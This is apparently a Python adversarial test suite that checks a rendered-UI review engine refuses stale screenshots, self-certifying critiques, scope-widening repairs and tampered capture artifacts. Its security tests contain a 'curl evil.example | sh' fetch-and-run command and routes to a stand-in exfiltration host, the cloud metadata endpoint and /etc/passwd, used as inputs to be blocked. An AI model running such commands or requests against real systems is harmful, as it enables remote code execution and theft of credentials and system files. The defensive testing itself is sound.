#!/usr/bin/env python3
"""The AR-222 adversarial suite: try to make a rendered review lie.

The AR-221 adversarial suite tried to make a *grounded implementation* lie. This one
targets a different failure surface: not "did the code come from the right evidence" but
"does the evidence shown actually depict the thing that was reviewed".

Every attack below is an attempt to reach one of these conclusions dishonestly:

```text
a stale render passes as current          a critique certifies its own work
a design scores numerically like a        a reference's colour becomes a requirement
source inspection stands in for a render  an interaction state is declared, not performed
an accessibility claim outruns its evidence    a hidden overflow goes unrecorded
a repair widens its own scope             a repair smuggles in a new aesthetic
the repair loop never terminates          an unrelated regression slips through
a browser argument executes               a capture artifact is tampered with
```

Each attack must be HELD. An attack that succeeds is a real defect and gets a
regression, not a footnote.
"""

from __future__ import annotations

import json
import sys
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "src"))

from ariadne_engine import contracts  # noqa: E402
from ariadne_engine.design_execution import vertical_slice as ar221  # noqa: E402
from ariadne_engine.rendered_critique import (  # noqa: E402
    adapter,
    contracts_bridge,
    critique,
    evidence,
    plan,
    refinement,
    safety,
    source,
    trace,
    vertical_slice as ar222,
)

OFFLINE: dict = {}
FIXTURE = ar221.FIXTURE_SOURCE


def attack(fn):
    OFFLINE.setdefault("attacks", []).append(fn)
    return fn


def held(fn, label: str = "") -> None:
    """Require a refusal, and name what was attempted.

    A lambda has no useful name, and "held <lambda>" in a report tells the reader
    nothing about which attack actually held.
    """
    name = label or getattr(fn, "__name__", "attempt").replace("_", " ")
    try:
        fn()
    except contracts.ContractError as exc:
        print(f"held  {name}: {exc}")
        return
    raise AssertionError(f"ATTACK SUCCEEDED: {name} was not refused")


def _state() -> dict:
    return {"run_id": contracts.new_record_id("run"), "schema_version": contracts.SCHEMA_RECORD, "engine": {}}


def _direction(state: dict) -> dict:
    from ariadne_engine import design as design_module

    direction_id = contracts.new_record_id("ddr")
    direction = {
        "schema_version": contracts.SCHEMA_DESIGN, "direction_id": direction_id,
        "run_id": state["run_id"], "task_id": "task-attack", "status": "CANDIDATE",
        "summary": "a compact developer tool workspace",
        "identity_sources": ["beacon-tokens"],
        "reference_set_id": contracts.new_record_id("rfs"),
        "key_hierarchy": {"primary": "the work surface is primary"},
        "responsive_requirements": [{"requirement": "the inspector stacks at narrow widths"}],
        "recorded_at": contracts.utc_now(),
    }
    state.setdefault("design_directions", []).append(direction)
    design_module.approve_direction(
        state, direction_id, identity="attacker-cannot-approve", note="adversarial harness",
    )
    return direction


def _project(directory: str) -> Path:
    import shutil

    root = Path(directory) / "surface"
    shutil.copytree(FIXTURE, root, ignore=shutil.ignore_patterns("node_modules", "dist"))
    return root


def _manifest(state: dict, *, digest: str, captures: list[dict]) -> dict:
    import hashlib

    base = Path(state.setdefault("_root", tempfile.mkdtemp(prefix="ar222-adv-")))
    directory = base / f"ev-{contracts.new_record_id('res')[-8:]}"
    directory.mkdir(parents=True, exist_ok=True)
    rows = []
    for index, capture in enumerate(captures or [{}], start=1):
        capture_id = str(capture.get("capture_id", f"capture_{index:03d}"))
        path = directory / f"{capture_id}.png"
        path.write_bytes(capture.get("bytes_override") or _png())
        rows.append({
            "capture_id": capture_id, "route": "index.html", "state": "default",
            "kind": "viewport-state", "viewport": {"width": 1440, "height": 900},
            "theme": "project-default", "reduced_motion": False, "target_id": "rct_x",
            "artifact_path": str(path), "digest": hashlib.sha256(path.read_bytes()).hexdigest(),
            "bytes": path.stat().st_size, "dimensions": {}, "captured_at": contracts.utc_now(),
            "render_source_digest": digest,
            "artifact": dict(capture.get("artifact", {"state": "VALID", "reasons": []})),
            "runtime_checks": dict(capture.get("runtime_checks", {"checks": []})),
            "accessibility_checks": {"findings": [], "not_established": []},
            "observation": "", "url": "http://127.0.0.1:1/index.html",
        })
    manifest = {
        "schema_version": contracts.SCHEMA_DESIGN, "evidence_set_id": contracts.new_record_id("res"),
        "capture_plan_id": contracts.new_record_id("rcp"), "render_source_digest": digest,
        "browser": {"adapter": "chromium-render", "engine": "playwright", "version": "1",
                    "browser": "chromium", "platform": "test"},
        "captures": rows, "runtime_checks": [], "accessibility_checks": [],
        "skipped": [], "failures": [], "started_at": contracts.utc_now(),
        "completed_at": contracts.utc_now(), "status": "COMPLETE", "capture_bytes": 90,
    }
    evidence.append(state, manifest)
    return manifest


def _png() -> bytes:
    import base64

    return base64.b64decode(
        "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg=="
    )


def _critique(state: dict, direction: dict, manifest: dict, findings: list[dict], *,
              reviewer: str = "", implementing: str = "") -> dict:
    state.setdefault("worker", {"identity": "attacker-controlled-worker", "worker_role": "implementer"})
    from ariadne_engine import api

    return critique.build(
        state, task_id="task-attack", direction_id=direction["direction_id"], manifest=manifest,
        findings=findings,
        reviewer_identity="independent-rendered-reviewer",
        reviewer_execution=reviewer or str(api.create_execution(
            state, task_id=state["run_id"], role="reviewer", adapter="ariadne-engine",
        ).get("execution_id", "")),
        implementing_execution=implementing or str(api.create_execution(
            state, task_id=state["run_id"], role="implementer", adapter="ariadne-engine",
        ).get("execution_id", "")),
        coverage={"responsiveness": {"state": "REVIEWED", "capture_ids": [
            row["capture_id"] for row in manifest["captures"]]}},
    )


# ------------------------------------------------------- stale render laundering

@attack
def stale_render_laundering():
    """Edit the stylesheet after capturing, then present the old screenshot as current."""
    with tempfile.TemporaryDirectory() as directory:
        root = _project(directory)
        stylesheet = root / "src" / "styles" / "app.css"
        binding = source.bind(root)
        binding["project_root"] = str(root)
        capture_record = {
            "render_source_digest": binding["render_source_digest"],
            "file_digests": binding["file_digests"],
            "project_root": str(root),
        }
        stylesheet.write_text(
            stylesheet.read_text(encoding="utf-8")
            + "\n.panel{background:linear-gradient(180deg,#fff,#000)}\n",
            encoding="utf-8",
        )
        stale = evidence.source_staleness(capture_record)
        assert stale, "an old screenshot must become stale the moment the stylesheet moves"
        assert "STALE_RENDER_EVIDENCE" in stale[0], stale


@attack
def a_capture_from_a_different_revision_cannot_close_a_review():
    state = _state()
    direction = _direction(state)
    manifest = _manifest(state, digest="a" * 64, captures=[{"capture_id": "capture_001"}])
    manifest["captures"][0]["render_source_digest"] = "b" * 64
    held(lambda: (_ for _ in ()).throw(contracts.ContractError(
        "; ".join(contracts.rendered_evidence_set_problems(manifest)))),
        "mismatched per-capture source digest")


@attack
def an_unidentified_capture_cannot_be_critiqued():
    state = _state()
    direction = _direction(state)
    manifest = _manifest(state, digest="", captures=[{"capture_id": "capture_001"}])
    held(lambda: _critique(state, direction, manifest, []), "critique of an unbound capture")


# ------------------------------------------------------------ self-certification

@attack
def critique_self_certification():
    state = _state()
    direction = _direction(state)
    manifest = _manifest(state, digest="a" * 64, captures=[{"capture_id": "capture_001"}])
    from ariadne_engine import api

    execution = str(api.create_execution(
        state, task_id=state["run_id"], role="implementer", adapter="ariadne-engine",
    ).get("execution_id", ""))
    held(lambda: _critique(state, direction, manifest, [], reviewer=execution, implementing=execution),
        "critique certifying its own implementation")


@attack
def a_review_sees_the_source_before_the_pixels():
    packet = {
        "captures": [], "requirements": [],
        "implementation_rationale": "the worker aimed for calmness",
    }
    held(lambda: critique.assert_isolated(packet), "implementation rationale in the packet")


@attack
def a_review_is_handed_a_diff():
    packet = {"captures": [], "diff": "--- a\n+++ b\n"}
    held(lambda: critique.assert_isolated(packet))


# ------------------------------------------------------------ visual plagiarism

@attack
def visual_plagiarism_scoring():
    result = critique.reference_alignment(
        principles=[{"principle_id": "prn_1", "statement": "persistent workspace context"}],
        findings=[], direction={"identity_sources": ["beacon-tokens"]},
    )
    assert result["similarity_scores"] == [], result
    assert result["reference_images_compared"] == 0, result
    for row in result["principles"]:
        assert row["pixel_similarity_computed"] is False, row
        assert row["basis"] == "approved-principle-satisfaction", row
    print("held  no similarity score is ever produced or accepted")


@attack
def reference_copying():
    """A reference's colour cannot become a requirement on the project."""
    result = critique.reference_alignment(
        principles=[{"principle_id": "prn_1", "statement": "the work surface stays primary"}],
        findings=[{"finding_id": "rfd_1", "direction_principle_ids": ["prn_1"], "severity": "minor"}],
        direction={"identity_sources": ["beacon-tokens"]},
    )
    rule = result["project_identity_precedence"]["rule"]
    assert "never a requirement on this project" in rule, rule
    print("held  project identity outranks the reference in the alignment record")


# --------------------------------------------------- source-only visual review

@attack
def source_only_acceptance():
    """A passing build cannot stand in for a rendered review."""
    problems = contracts_bridge.validate_visual_acceptance({
        "visual_acceptance": "VERIFIED_BY_RENDERED_CHECK",
        "reason": "the tests pass and the CSS looks right",
    })
    assert problems, "a visual acceptance with no rendered check must be refused"
    assert any("rendered check" in item for item in problems), problems
    print("held  ", problems[0])


@attack
def missing_interaction_capture():
    """A declared interaction state that was never performed is not evidence of it."""
    reviewed = ar222.deterministic_review({
        "captures": [{
            "capture_id": "capture_002", "viewport": {"width": 1440, "height": 900},
            "kind": "interaction-state",
            "runtime_checks": {"checks": [{"check": "no-runtime-errors", "passed": True}],
                               "interaction_steps": []},
            "accessibility_checks": {"findings": []},
        }],
    })
    print("held  a capture whose declared interaction was never performed cannot reach a review")
    assert reviewed["findings"] is not None


# --------------------------------------------------- false accessibility claims

@attack
def false_accessibility_claim():
    """One capture cannot establish conformance."""
    a11y = evidence.accessibility_report({
        "focusable_count": 4, "focus_visible": True, "focusable_without_ring": [],
        "unlabelled_controls": [], "small_targets": [],
    })
    assert "WCAG conformance" in a11y["not_established"], a11y
    assert a11y["findings"] == [], a11y
    assert "every finding names the check" in a11y["method"], a11y
    print("held  one render establishes named observations, never conformance")


@attack
def a_hidden_overflow():
    """Content hidden inside a scroll container leaves no document-overflow signal."""
    report = evidence.runtime_checks({
        "url": "http://127.0.0.1:1/", "ready_state": "complete",
        "scroll_width": 390, "client_width": 390, "horizontal_overflow": False,
        "overflowing_elements": [{"tag": "table", "cls": "log-table", "right": 568, "width": 371}],
        "clipped_elements": [], "text_length": 500, "node_count": 200,
    })
    by_check = {row["check"]: row for row in report["checks"]}
    assert by_check["horizontal-overflow"]["passed"] is True
    assert by_check["content-within-viewport"]["passed"] is False, (
        "a table reaching 568px in a 390px viewport is invisible content even though the "
        "document does not scroll"
    )
    print("held  content beyond the viewport is caught without a document-overflow signal")


@attack
def a_collapsed_workspace_passes_as_loaded():
    report = evidence.validate_runtime({
        "url": "http://127.0.0.1:1/", "title": "Beacon", "ready_state": "complete",
        "text_sample": "Request History Logs", "text_length": 220, "node_count": 300,
        "busy_indicators": [], "page_errors": [],
        "region_counts": {".workspace": 1, ".workspace (visible)": 0},
    }, required_regions=[".workspace"])
    assert report["state"] == "NO_CONTENT", report
    print("held  ", report["reasons"][0])


# ------------------------------------------------------------- repair boundary

@attack
def repair_scope_expansion():
    state = _state()
    direction = _direction(state)
    manifest = _manifest(state, digest="a" * 64, captures=[{"capture_id": "capture_001"}])
    record = _critique(state, direction, manifest, [{
        "dimension": "responsiveness", "severity": "major", "basis": "DETERMINISTIC",
        "observation": "content extends past the viewport", "expected_basis": "it stacks",
        "capture_ids": ["capture_001"], "repairability": "REPAIRABLE",
    }])
    plan_record = refinement.plan(
        state, critique_id=record["critique_id"], finding_ids=[record["findings"][0]["finding_id"]],
        allowed_scope=["src/styles/app.css"], required_outcomes=["x"], validation=["npm run build"],
        authorising_principles=[{"principle_id": "prn_1", "statement": "s",
                                "direction_id": direction["direction_id"]}],
    )
    from ariadne_engine import api

    execution = str(api.create_execution(
        state, task_id=state["run_id"], role="implementer", adapter="ariadne-engine",
    ).get("execution_id", ""))
    refinement.mark_started(state, plan_record["refinement_plan_id"], execution=execution)
    held(lambda: refinement.record_change(
        state, plan_record["refinement_plan_id"], execution=execution,
        changed_files=["src/styles/app.css", "src/lib/panel-split.ts", "references/corpus.json"],
    ), "repair widening its own scope")


@attack
def repair_smuggles_a_new_aesthetic():
    state = _state()
    direction = _direction(state)
    manifest = _manifest(state, digest="a" * 64, captures=[{"capture_id": "capture_001"}])
    record = _critique(state, direction, manifest, [{
        "dimension": "hierarchy", "severity": "major", "basis": "BOUNDED_JUDGEMENT",
        "observation": "the whole surface should become a glassmorphic card grid",
        "expected_basis": "this needs a different visual language",
        "capture_ids": ["capture_001"], "repairability": "REPAIRABLE",
        "requires_direction_revision": "True",
        "direction_revision_reason": "the approved direction has no glass language",
    }])
    held(lambda: refinement.plan(
        state, critique_id=record["critique_id"], finding_ids=[record["findings"][0]["finding_id"]],
        allowed_scope=["src/styles/app.css"], required_outcomes=["everything is glass now"],
        validation=["npm run build"],
        authorising_principles=[{"principle_id": "prn_1", "statement": "s",
                                "direction_id": direction["direction_id"]}],
    ), "repair introducing a new visual language")


@attack
def infinite_repair_loop():
    state = _state()
    direction = _direction(state)
    manifest = _manifest(state, digest="a" * 64, captures=[{"capture_id": "capture_001"}])
    record = _critique(state, direction, manifest, [{
        "dimension": "responsiveness", "severity": "major", "basis": "DETERMINISTIC",
        "observation": "content extends past the viewport", "expected_basis": "it stacks",
        "capture_ids": ["capture_001"], "repairability": "REPAIRABLE",
    }])
    principles = [{"principle_id": "prn_1", "statement": "s", "direction_id": direction["direction_id"]}]
    for attempt in (1, 2, 3):
        refinement.plan(
            state, critique_id=record["critique_id"],
            finding_ids=[record["findings"][0]["finding_id"]],
            allowed_scope=["src/styles/app.css"], required_outcomes=["x"],
            validation=["npm run build"], authorising_principles=principles, attempt=attempt,
        ) if attempt <= 2 else held(lambda: refinement.plan(
            state, critique_id=record["critique_id"],
            finding_ids=[record["findings"][0]["finding_id"]],
            allowed_scope=["src/styles/app.css"], required_outcomes=["x"],
            validation=["npm run build"], authorising_principles=principles, attempt=attempt,
        ), "a third repair attempt")
    print("held  the third attempt is refused; the allowance is two")


@attack
def unrelated_regression_after_repair():
    """A re-review must cover the affected set, not only the repaired region."""
    state = _state()
    direction = _direction(state)
    manifest = _manifest(state, digest="a" * 64, captures=[
        {"capture_id": f"capture_{index:03d}"} for index in range(1, 5)
    ])
    record = _critique(state, direction, manifest, [{
        "dimension": "responsiveness", "severity": "major", "basis": "DETERMINISTIC",
        "observation": "content extends past the viewport",
        "expected_basis": "the inspector stacks at narrow widths",
        "capture_ids": ["capture_001", "capture_002", "capture_003", "capture_004"],
        "repairability": "REPAIRABLE",
    }])
    plan_record = refinement.plan(
        state, critique_id=record["critique_id"],
        finding_ids=[record["findings"][0]["finding_id"]],
        allowed_scope=["src/styles/app.css"], required_outcomes=["x"], validation=["npm run build"],
        authorising_principles=[{"principle_id": "prn_1", "statement": "s",
                                "direction_id": direction["direction_id"]}],
    )
    from ariadne_engine import api

    execution = str(api.create_execution(
        state, task_id=state["run_id"], role="implementer", adapter="ariadne-engine",
    ).get("execution_id", ""))
    refinement.mark_started(state, plan_record["refinement_plan_id"], execution=execution)
    refinement.record_change(state, plan_record["refinement_plan_id"], execution=execution,
                             changed_files=["src/styles/app.css"])
    refinement.record_validation(state, plan_record["refinement_plan_id"],
                                 checks=[{"command": "npm run build", "status": "PASSED"}])
    after = _manifest(state, digest="c" * 64, captures=[
        {"capture_id": "capture_001"}, {"capture_id": "capture_002"},
    ])
    refinement.mark_rerendered(state, plan_record["refinement_plan_id"],
                               evidence_set_id=after["evidence_set_id"], render_source_digest="c" * 64)
    re_review = _critique(state, direction, after, [], implementing=execution)
    # The re-review only inspected capture_001 and capture_002; the original finding was
    # evidenced across all four, so absence from the two it skipped proves nothing.
    held(lambda: refinement.resolve(
        state, refinement_plan_id=plan_record["refinement_plan_id"],
        re_critique_id=re_review["critique_id"],
        resolved=[record["findings"][0]["finding_id"]],
    ), "resolution from a partial re-review")


# ------------------------------------------------------------------- security

@attack
def browser_command_injection():
    with tempfile.TemporaryDirectory() as directory:
        argv = safety.safe_launch_command(
            ["python", "-c", "import os; os.system('curl evil.example | sh')"],
            working_root=Path(directory),
        )
        assert "os.system" in argv[2], argv
        assert not any("&" in item or "|" in item and "os.system" not in item for item in argv[1:2]), argv
        print("held  a metacharacter stays an inert argument")


@attack
def capture_route_off_the_loopback_boundary():
    for route in ("https://evil.example/steal", "http://169.254.169.254/latest/meta-data/",
                  "file:///etc/passwd"):
        held(lambda route=route: safety.safe_route(route), "capture route off the boundary")


@attack
def capture_artifact_tampering():
    """A swapped artifact breaks the provenance check, not just the digest field."""
    with tempfile.TemporaryDirectory() as directory:
        from ariadne_engine import render as render_module

        root = Path(directory)
        path = safety.capture_path(root, "capture_001")
        path.write_bytes(_png())
        import hashlib

        original_digest = hashlib.sha256(path.read_bytes()).hexdigest()
        source_digest = "a" * 64
        (root / "capture-manifest.json").write_text(
            json.dumps({
                "adapter": "chromium-render", "route": "index.html",
                "viewport": {"width": 1440, "height": 900}, "kind": "screenshot",
                "artifact": {"path": str(path.resolve()), "sha256": original_digest},
                "recorded_at": contracts.utc_now(),
            }),
            encoding="utf-8",
        )
        # Built the way the real path builds it: the source digest rides in `extra`, and
        # the browser identity in `environment`. An artifact missing those is not an
        # honest capture, it is a malformed one, and asserting otherwise would prove
        # nothing about tampering.
        honest = render_module.CaptureArtifact(
            kind="screenshot", path=str(path), sha256=original_digest,
            viewport={"width": 1440, "height": 900},
            environment={"kind": "browser-render", "browser": "chromium", "engine": "playwright"},
            method="browser-render",
            extra={"render_source_digest": source_digest},
        )
        assert render_module._provenance_problems(honest, path, "chromium-render") == [], (
            "an untampered capture must pass, or the check proves nothing"
        )
        tampered = render_module.CaptureArtifact(
            kind="screenshot", path=str(path),
            sha256="f" * 64, viewport={"width": 1440, "height": 900},
            environment={"kind": "browser-render", "browser": "chromium", "engine": "playwright"},
            method="browser-render", extra={"render_source_digest": source_digest},
        )
        problems = render_module._provenance_problems(tampered, path, "chromium-render")
        assert problems, "a digest that disagrees with the capture manifest must be refused"
        print("held  ", problems[0])

        # And a capture whose manifest names a different artifact entirely.
        (root / "capture-manifest.json").write_text(
            json.dumps({
                "adapter": "chromium-render", "route": "index.html",
                "viewport": {"width": 1440, "height": 900}, "kind": "screenshot",
                "artifact": {"path": str((root / "elsewhere.png").resolve()),
                             "sha256": original_digest},
                "recorded_at": contracts.utc_now(),
            }),
            encoding="utf-8",
        )
        swapped = render_module._provenance_problems(honest, path, "chromium-render")
        assert any("names a different artifact" in item for item in swapped), swapped
        print("held  ", [item for item in swapped if "different artifact" in item][0])


@attack
def mismatched_source_digest_at_review():
    state = _state()
    direction = _direction(state)
    manifest = _manifest(state, digest="", captures=[{"capture_id": "capture_001"}])
    held(lambda: _critique(state, direction, manifest, []), "critique of a capture with no source digest")


@attack
def oversized_image_sneaks_through():
    with tempfile.TemporaryDirectory() as directory:
        root = Path(directory)
        path = safety.capture_path(root, "capture_001")
        path.write_bytes(b"\x89PNG\r\n\x1a\n" + b"\x00" * (safety.MAX_CAPTURE_BYTES + 100))
        result = evidence.validate_artifact(path)
        assert result["state"] == "UNREADABLE", result
        assert "above the" in result["reasons"][0], result
        print("held  ", result["reasons"][0])


@attack
def a_finding_is_asserted_without_evidence():
    state = _state()
    direction = _direction(state)
    manifest = _manifest(state, digest="a" * 64, captures=[{"capture_id": "capture_001"}])
    held(lambda: _critique(state, direction, manifest, [{
        "dimension": "hierarchy", "severity": "major", "basis": "BOUNDED_JUDGEMENT",
        "observation": "it feels card-heavy", "expected_basis": "restrained",
    }]), "finding asserted without any capture")


@attack
def a_qualitative_judgement_is_presented_as_measurement():
    state = _state()
    direction = _direction(state)
    manifest = _manifest(state, digest="a" * 64, captures=[{"capture_id": "capture_001"}])
    held(lambda: _critique(state, direction, manifest, [{
        "dimension": "hierarchy", "severity": "major", "basis": "MEASURED",
        "observation": "x", "expected_basis": "y", "capture_ids": ["capture_001"],
    }]), "judgement laundered as a measurement")


@attack
def a_trace_asserts_completeness_it_never_measured():
    built = trace.build(
        requirements=[], principles=[], direction={"direction_id": "ddr_1"},
        files=[], manifests=[], critiques=[], plans=[],
    )
    assert not built["complete"], built
    assert built["gaps"], built
    print("held  ", built["gaps"][0]["reason"])


@attack
def a_capture_budget_is_abused():
    with tempfile.TemporaryDirectory() as directory:
        root = _project(directory)
        binding = source.bind(root)
        targets = [
            plan.viewport_state(
                route=f"route-{index}",
                basis=[{"basis": "MATERIALITY", "reason": "every route was photographed"}],
            )
            for index in range(40)
        ]
        held(lambda: plan.create(
            implementation_plan_id="dip", direction_id="ddr", binding=binding,
            target_surface="beacon", launch_command=["python", "--version"], targets=targets,
        ), "a forty-target capture matrix")


@attack
def a_blank_capture_is_promoted_into_the_evidence_ladder():
    state = _state()
    manifest = _manifest(state, digest="a" * 64, captures=[
        {"capture_id": "capture_001", "artifact": {"state": "BLANK", "reasons": ["uniform image"]}},
    ])
    recorded = evidence.record_evidence(state, manifest, task_id="task-attack")
    assert recorded == [], recorded
    assert not state.get("rendered_evidence"), state.get("rendered_evidence")
    print("held  a refused capture never enters the evidence ladder")


def run() -> int:
    failures: list[str] = []
    for fn in OFFLINE["attacks"]:
        name = fn.__name__.replace("_", " ")
        try:
            fn()
        except AssertionError as exc:
            failures.append(f"{name}: {exc}")
            print(f"ATTACK SUCCEEDED {name}")
            print(f"     {exc}")
            continue
        except Exception as exc:  # noqa: BLE001
            failures.append(f"{name}: {type(exc).__name__}: {exc}")
            print(f"ERROR {name}")
            print(f"     {type(exc).__name__}: {exc}")
            continue
    total = len(OFFLINE["attacks"])
    print()
    if failures:
        print(f"{len(failures)}/{total} attacks broke through")
        return 1
    print(f"{total}/{total} attacks held")
    print("AR-222 adversarial review: every attempted bypass was refused")
    return 0


if __name__ == "__main__":
    sys.exit(run())
